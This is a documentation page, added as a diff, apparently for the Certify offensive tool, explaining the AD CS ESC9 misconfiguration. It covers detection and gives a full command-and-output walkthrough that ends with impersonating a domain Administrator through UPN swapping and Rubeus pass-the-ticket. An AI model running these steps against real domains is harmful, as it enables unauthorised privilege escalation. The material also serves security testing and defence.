@@ -1,0 +1,259 @@
+---
+title: 'ESC9 - Security Extension Disabled on Certificate Template'
+description: 'Exploit certificate templates with NO_SECURITY_EXTENSION flag to bypass certificate mapping and impersonate users'
+icon: 'shield-slash'
+sidebarTitle: 'ESC9'
+---
+
+ESC9 is a misconfiguration in Active Directory Certificate Services (AD CS), which stems from insecure management of security features. Specifically, if the `Enrollment Flag` attribute for a certificate template includes the `NO_SECURITY_EXTENSION` flag, the certificate authority will not include a SID security extension in certificates issued from this template.
+
+<Info>
+The misconfiguration was initially disclosed by [Oliver Lyak](https://x.com/ly4k_) in [this blogpost](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7).
+</Info>
+
+## Vulnerability Criteria
+
+The following criteria comprise an ESC9 vulnerability:
+
+<Accordion title="ESC9 Vulnerability Requirements">
+- The enterprise CA grants enrollment rights to the attacker-controlled user.
+  - Otherwise, the user would be unable to request any certificates from the CA.
+- The certificate template grants enrollment rights to the attacker-controlled user.
+  - Otherwise, the user would be unable to request certificates based on the specific template.
+- The "manager approval" feature is disabled for the certificate template.
+  - Otherwise, a "CA Manager" would have to manually review and approve the certificate request.
+- The "authorized signature" feature is disabled for the certificate template.
+  - Otherwise, an enrollment agent would need to sign the certificate request on behalf of the requester.
+- The certificate template defines an Extended Key Usage (EKU) that enables client authentication.
+  - `Client Authentication` (`1.3.6.1.5.5.7.3.2`)
+  - `PKINIT Client Authentication` (`1.3.6.1.5.2.3.4`)
+  - `Smart Card Logon` (`1.3.6.1.4.1.311.20.2.2`)
+  - `Any Purpose` (`2.5.29.37.0`)
+  - `Subordinate CA` (No EKUs)
+- The certificate template has been configured to not include the SID security extension.
+  - Otherwise, the user can only request certificates that are strongly mapped to itself, and cannot impersonate others.
+</Accordion>
+
+## Exploitation Methods
+
+There are currently two documented methods for exploiting this misconfiguration:
+
+<Accordion title="Method 1: ESC6 + ESC9 Combination">
+If [ESC6](./esc6-request-attribute-san-editf-attributesubjectaltname2) is enabled, we can supply an arbitrary Subject Alternative Name (SAN) for the vulnerable certificate. Since this uses the URL-based SAN format which contains the SID of the target user, this attack method will work even if *Strong Certificate Mapping* is **enabled**. For more information about this scenario, please refer to the attack described in [ESC6](./esc6-request-attribute-san-editf-attributesubjectaltname2).
+</Accordion>
+
+<Accordion title="Method 2: Weak Certificate Mapping Attack">
+If *Strong Certificate Mapping* is **disabled** or in **compatibility mode** and we have `GenericWrite` rights on a principal that we can access and which has enrollment rights on the certificate template, we can abuse certificate mapping weaknesses to impersonate a target principal. For this attack to be possible, the certificate template must define a UPN-mappable or DNS-mappable flag in its `Certificate Name Flag` attribute:
+
+- `SUBJECT_ALT_REQUIRE_UPN`
+- `SUBJECT_ALT_REQUIRE_SPN` - This flag relies on the `userPrincipalName` attribute, despite the name hinting at SPN.
+- `SUBJECT_ALT_REQUIRE_DNS` - This does not work if the target is a user (as they do not have the `dNSHostName` attribute)
+</Accordion>
+
+## Weak Certificate Mapping Attack Steps
+
+The second method consists of the following steps:
+
+<Accordion title="Attack Process">
+1. **Temporarily modify a mapping attribute** of the principal to match that of the target principal that we want to impersonate.
+   - If the template has the `SUBJECT_ALT_REQUIRE_UPN` flag or the `SUBJECT_ALT_REQUIRE_SPN` flag, the `userPrincipalName` attribute of the attacker-controlled principal must match the `userPrincipalName` or `sAMAccountName` attribute of the target principal.
+   - If the template has the `SUBJECT_ALT_REQUIRE_DNS` flag, the `dNSHostName` attribute of the attacker-controlled principal must match the `dNSHostName` attribute of the target principal.
+
+2. **Request a certificate** from the vulnerable template. The issued certificate will contain a Subject Alternative Name (SAN) based on the mapping attribute of our requesting user (which is identical to that of our target principal).
+
+3. **Revert the temporary mapping attribute modification.** The target principal is now the only user in the domain with an attribute that matches the one in our issued certificate.
+
+4. **Authenticate as the impersonated user.** This is possible because there is no SID security extension in the certificate (due to ESC9) and the mapping attribute of the certificate matches only our target principal (after we reverted our own changes).
+</Accordion>
+
+## Detection
+
+We can search for certificate templates with these conditions using the `enum-templates --filter-vulnerable` command from Certify. For more information about the command and its parameters, please refer to the [Command Overview](./1-command-overview) page.
+
+<CodeGroup>
+```bash Command
+Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins
+```
+
+```diff Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=corp,DC=local'
+[*] Classifying vulnerabilities in the context of built-in low-privileged domain groups.
+
+[*] Listing info about the enterprise certificate authority 'CORP-CA01-CA'
+
+    ...
+
+[*] Certificate templates found using the current filter parameters:
+
+    Template Name                         : CustomNoExtension
+    Enabled                               : True
+    Publishing CAs                        : ca01.corp.local\CORP-CA01-CA
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
++   Certificate Name Flag                 : SUBJECT_ALT_REQUIRE_UPN
++   Enrollment Flag                       : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, NO_SECURITY_EXTENSION
++   Manager Approval Required             : False
++   Authorized Signatures Required        : 0
++   Extended Key Usage                    : Client Authentication, Encrypting File System, Secure Email
+    Certificate Application Policies      : Client Authentication, Encrypting File System, Secure Email
+    Vulnerabilities
++     ESC9                                : The template has a client authentication EKU and no security extension.
+    Permissions
+      Enrollment Permissions
++       All Extended Rights         : NT AUTHORITY\Authenticated Users   S-1-5-11
+      Object Control Permissions
+
+Certify completed in 00:00:00.9512699
+```
+</CodeGroup>
+
+## Exploitation Example
+
+Once we have identified a vulnerable ESC9 certificate template that our attacker-controlled user has enrollment rights for, we can perform the weak certificate mapping attack. Since the certificate template contains the `SUBJECT_ALT_REQUIRE_UPN` flag, we must modify the `userPrincipalName` of our attacker-controlled user to match a target user that we want to impersonate (e.g. `Administrator`).
+
+<CodeGroup>
+```powershell Step 1: Modify UPN
+Set-ADUser -Identity impersonator -UserPrincipalName 'Administrator'
+Get-ADUser -Identity impersonator
+```
+
+```bash Output
+DistinguishedName : CN=impersonator,OU=Users,OU=Corp,DC=corp,DC=local
+Enabled           : True
+GivenName         : impersonator
+Name              : impersonator
+ObjectClass       : user
+ObjectGUID        : 66e9a70c-6603-4199-967d-58be81907c02
+SamAccountName    : impersonator
+SID               : S-1-5-21-976219687-1556195986-4104514715-1101
+Surname           :
+UserPrincipalName : Administrator
+```
+</CodeGroup>
+
+We can then request a certificate based on the vulnerable template as the attacker-controlled user and obtain a certificate with a Subject Alternative Name (SAN) that contains the mapping attribute that will link to the target principal (e.g. `Administrator`). This can be done using the `request` command from Certify.
+
+<CodeGroup>
+```bash Step 2: Request Certificate
+Certify.exe request --ca ca01.corp.local\CORP-CA01-CA --template CustomNoExtension
+```
+
+```bash Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Request a certificate
+
+[*] Current user context    : CORP\impersonator
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : CustomNoExtension
+[*] Subject                 : CN=impersonator, OU=Users, OU=Corp, DC=corp, DC=local
+
+[*] Certificate Authority   : ca01.corp.local\CORP-CA01-CA
+[*] CA Response             : The certificate has been issued.
+[*] Request ID              : 1
+
+[*] Certificate (PFX)       :
+
+MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh...
+
+Certify completed in 00:00:03.8732299
+```
+</CodeGroup>
+
+Once we have obtained the certificate, we can revert our mapping attribute modifications.
+
+<CodeGroup>
+```powershell Step 3: Revert UPN
+Set-ADUser -Identity impersonator -Clear UserPrincipalName
+Get-ADUser -Identity impersonator
+```
+
+```bash Output
+DistinguishedName : CN=impersonator,OU=Users,OU=Corp,DC=corp,DC=local
+Enabled           : True
+GivenName         : impersonator
+Name              : impersonator
+ObjectClass       : user
+ObjectGUID        : 66e9a70c-6603-4199-967d-58be81907c02
+SamAccountName    : impersonator
+SID               : S-1-5-21-976219687-1556195986-4104514715-1101
+Surname           :
+UserPrincipalName :
+```
+</CodeGroup>
+
+Now that only the target principal has a mapping attribute that matches the one in the issued certificate, we can authenticate as the target principal by presenting the issued certificate. This can be done using [Rubeus](/ghostpack-docs/Rubeus-mdx/overview) with the [`asktgt`](/ghostpack-docs/Rubeus-mdx/commands/ticket-requests/asktgt) command.
+
+<CodeGroup>
+```bash Step 4: Authenticate
+Rubeus.exe asktgt /user:Administrator /certificate:MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh... /ptt
+```
+
+```bash Output
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=lowpriv, OU=Users, OU=Corp, DC=corp, DC=local
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'corp.local\Administrator'
+[*] Using domain controller: 10.10.10.10:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIGcjCCBm6gAwIBBaEDAgEWooIFfzCCBXthggV3MIIFc6ADAgEFoQ8bDU1FR0FLRUsuTE9DQUyiIjAg
+      ...
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/corp.local
+  ServiceRealm             :  CORP.LOCAL
+  UserName                 :  Administrator
+  UserRealm                :  CORP.LOCAL
+  StartTime                :  30/06/2025 18.13.10
+  EndTime                  :  01/07/2025 04.13.10
+  RenewTill                :  07/07/2025 18.13.10
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  wAFNZlLQrfb4N92MQjR1fw==
+  ASREP (key)              :  16C90B51B01389B03C92F422EFBFF805
+```
+</CodeGroup>
+
+Since the `/ptt` parameter was supplied to [Rubeus](/ghostpack-docs/Rubeus-mdx/overview) when requesting the TGT, the ticket has been injected into the Kerberos ticket list, and we should be able to authenticate as the target user and access systems that the target user has access to.
+
+<CodeGroup>
+```powershell Verification
+Invoke-Command -ComputerName DC01 -ScriptBlock { whoami }
+```
+
+```bash Output
+CORP\Administrator
+```
+</CodeGroup>
